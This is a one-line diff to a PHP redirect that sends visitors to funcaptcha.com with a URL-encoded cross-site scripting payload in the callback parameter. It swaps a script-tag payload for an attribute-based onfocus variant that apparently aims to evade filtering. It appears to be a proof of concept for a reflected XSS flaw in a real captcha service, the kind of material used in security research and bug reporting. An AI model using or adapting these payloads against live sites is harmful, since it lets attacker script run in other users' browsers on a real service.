@@ -1,1 +1,1 @@
-<?php header('Location: https://funcaptcha.com/fc/a/?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E'); ?> 
+<?php header('Location: https://funcaptcha.com/fc/a/?callback=%3Cx~%0Aonfocus=alert%281%29%20id=a%20tabindex=0%3E#a'); ?> 
